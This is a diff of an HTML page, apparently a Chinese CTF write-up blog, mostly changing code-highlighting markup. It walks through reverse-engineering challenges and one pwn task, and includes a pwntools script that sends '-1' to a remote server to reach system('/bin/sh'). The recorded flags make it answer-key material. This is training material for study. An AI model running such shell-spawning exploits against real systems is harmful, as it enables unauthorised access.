 <a href="https://postimg.cc/T5jMy5NV" target="_blank" rel="noopener noreffer "><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -2159,8 +2158,8 @@ flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数�
         data-sizes="auto"
         alt="https://i.postimg.cc/QCwXyppy/A20-Z-V-U9-F8-Z3-PSKGQ3-XU.png"
         title="A20-Z-V-U9-F8-Z3-PSKGQ3-XU.png" /></a></p>
-<h3 id="maze">maze</h3>
-<p>查壳发现有upx壳, 先脱个壳
+<h3 id="maze" class="headerLink">
+    <a href="#maze" class="header-mark"></a>maze</h3><p>查壳发现有upx壳, 先脱个壳
 用IDA打开, main函数大概是这个样子.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2275,28 +2274,28 @@ flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数�
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v18</span><span class="p">[</span><span class="mi">19</span><span class="p">];</span> <span class="c1">// [rsp+A8h] [rbp-38h] BYREF
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// [rsp+C8h] [rbp-18h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">  <span class="n">v19</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v19</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">ostream</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="n">basic_string</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="nf">basic_string</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&gt;&gt;&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">istream</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="n">length</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="n">v13</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="nf">length</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="n">v13</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">v14</span><span class="p">,</span> <span class="s">&#34;*#########&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v14</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;**########&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="s">&#34;#*########&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v15</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;***#######&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">v16</span><span class="p">,</span> <span class="s">&#34;*#***##***&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v16</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;**##****#*&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">&#34;#**######*&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v17</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;#*#*******&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">v18</span><span class="p">,</span> <span class="s">&#34;**#*######&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v18</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;###*******&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">v14</span><span class="p">,</span> <span class="s">&#34;*#########&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v14</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;**########&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="s">&#34;#*########&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v15</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;***#######&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">v16</span><span class="p">,</span> <span class="s">&#34;*#***##***&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v16</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;**##****#*&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">&#34;#**######*&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v17</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;#*#*******&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">v18</span><span class="p">,</span> <span class="s">&#34;**#*######&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v18</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span> <span class="s">&#34;###*******&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v13</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">v10</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="n">begin</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="n">end</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v10</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="nf">begin</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="nf">end</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">__gnu_cxx</span><span class="o">::</span><span class="n">operator</span><span class="o">!=&lt;</span><span class="kt">char</span> <span class="o">*</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;&gt;</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">                               <span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">                               <span class="n">v11</span><span class="p">)</span> <span class="p">)</span>
@@ -2343,7 +2342,7 @@ flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数�
 </span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">ostream</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::~</span><span class="n">basic_string</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::~</span><span class="nf">basic_string</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
@@ -2399,8 +2398,8 @@ flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数�
 </span></span><span class="line"><span class="cl">手过迷宫或者写个dfs(还没手过快)
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="mixture">mixture</h3>
-<p>给了个程序, 里面是各种语言拼成的Aes加密, 但是仔细观察之后发现只需要删删东西, 剩下go语言的解码部分再加一句输出就可以跑了.</p>
+</div><h3 id="mixture" class="headerLink">
+    <a href="#mixture" class="header-mark"></a>mixture</h3><p>给了个程序, 里面是各种语言拼成的Aes加密, 但是仔细观察之后发现只需要删删东西, 剩下go语言的解码部分再加一句输出就可以跑了.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
@@ -2691,8 +2690,8 @@ flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数�
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="dynamic_reverse">dynamic_reverse</h3>
-<p>这题一看就是要动态调试, 但是我不怎么会用gdb所以&hellip;.
+</div><h3 id="dynamic_reverse" class="headerLink">
+    <a href="#dynamic_reverse" class="header-mark"></a>dynamic_reverse</h3><p>这题一看就是要动态调试, 但是我不怎么会用gdb所以&hellip;.
 IDA看一眼主函数里执行了个message</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2725,7 +2724,7 @@ IDA看一眼主函数里执行了个message</p>
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v4</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [rsp+4Ah] [rbp-16h] BYREF
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-8h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="n">v2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x20091406110B131FLL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="n">v2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3B2D170100170417LL</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="n">v2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1B1F131C0B362D06LL</span><span class="p">;</span>
@@ -2734,7 +2733,7 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">29199</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">i</span> <span class="o">^=</span> <span class="mh">0x72u</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v5</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v5</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -2781,7 +2780,7 @@ IDA看一眼主函数里执行了个message</p>
 </span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;cstdio&gt;</span><span class="cp">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include&lt;cstdio&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">byte_pointer</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -2822,8 +2821,8 @@ IDA看一眼主函数里执行了个message</p>
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>输出了个R{ftcyamI_esreveimanyD_tSI_yllac!elpm1S_, 一看感觉至少mayctf反了, 所以倒过来输出_S1mple!cally_ISt_Dynamieverse_Imayctf{R, 乱但不是很乱, 可以看出大概有什么单词, 手动重新排列一下, 多提交几次试试. 得到flag:mayctf{Reverse_It_Dynamically_IS_S1mple!}</p>
-<h3 id="native_android">native_android</h3>
-<p>题目提示在安卓程序里执行c++代码, 所以在网上搜了一下在Android里调用c++代码的相关知识, 知道这是用.so动态链接库实现的.
+<h3 id="native_android" class="headerLink">
+    <a href="#native_android" class="header-mark"></a>native_android</h3><p>题目提示在安卓程序里执行c++代码, 所以在网上搜了一下在Android里调用c++代码的相关知识, 知道这是用.so动态链接库实现的.
 用jeb打开apk可以看到:
 <a href="https://postimg.cc/CnYFCrLt" target="_blank" rel="noopener noreffer "><img
         class="lazyload"
@@ -2999,7 +2998,7 @@ IDA看一眼主函数里执行了个message</p>
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="cp">#define _BYTE char
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;cstdio&gt;</span><span class="cp">
+</span></span><span class="line"><span class="cl"><span class="cp">#include&lt;cstdio&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="kt">long</span> <span class="nf">encrypt</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
@@ -3154,8 +3153,8 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl"><span class="c1">//https://blog.csdn.net/hbdatouerzi/article/details/54927364
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="hello_exception">hello_exception</h3>
-<p>题目提示了是异常相关的内容.
+</div><h3 id="hello_exception" class="headerLink">
+    <a href="#hello_exception" class="header-mark"></a>hello_exception</h3><p>题目提示了是异常相关的内容.
 先找到验证flag的函数sub_23E8.
 <a href="https://postimg.cc/tZ7XBnhd" target="_blank" rel="noopener noreffer "><img
         class="lazyload"
@@ -3238,9 +3237,9 @@ IDA看一眼主函数里执行了个message</p>
 </span><span class="lnt">67
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;cstdio&gt;</span><span class="cp">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include&lt;cstdio&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;cctype&gt;</span><span class="cp">
+</span></span><span class="line"><span class="cl"><span class="cp">#include&lt;cctype&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
@@ -3307,9 +3306,9 @@ IDA看一眼主函数里执行了个message</p>
 </span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="pwn">pwn</h2>
-<h3 id="get_my_number">get_my_number</h3>
-<p>看核心代码</p>
+</div><h2 id="pwn" class="headerLink">
+    <a href="#pwn" class="header-mark"></a>pwn</h2><h3 id="get_my_number" class="headerLink">
+    <a href="#get_my_number" class="header-mark"></a>get_my_number</h3><p>看核心代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -3339,7 +3338,7 @@ IDA看一眼主函数里执行了个message</p>
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
@@ -3347,7 +3346,7 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Am I that old?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Am I that old?&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -3357,7 +3356,7 @@ IDA看一眼主函数里执行了个message</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="k">else</span>
 </span></span><span class="line"><span class="cl">
@@ -3384,21 +3383,21 @@ IDA看一眼主函数里执行了个message</p>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#34;124.220.41.254&#34;</span><span class="p">,</span><span class="mi">12351</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="s">&#34;124.220.41.254&#34;</span><span class="p">,</span><span class="mi">12351</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s">&#34;-1&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">#flag{a_s3cr3t_makes_a_w0man_w0man}
 </span></span></span></code></pre></td></tr></table>
 </div>
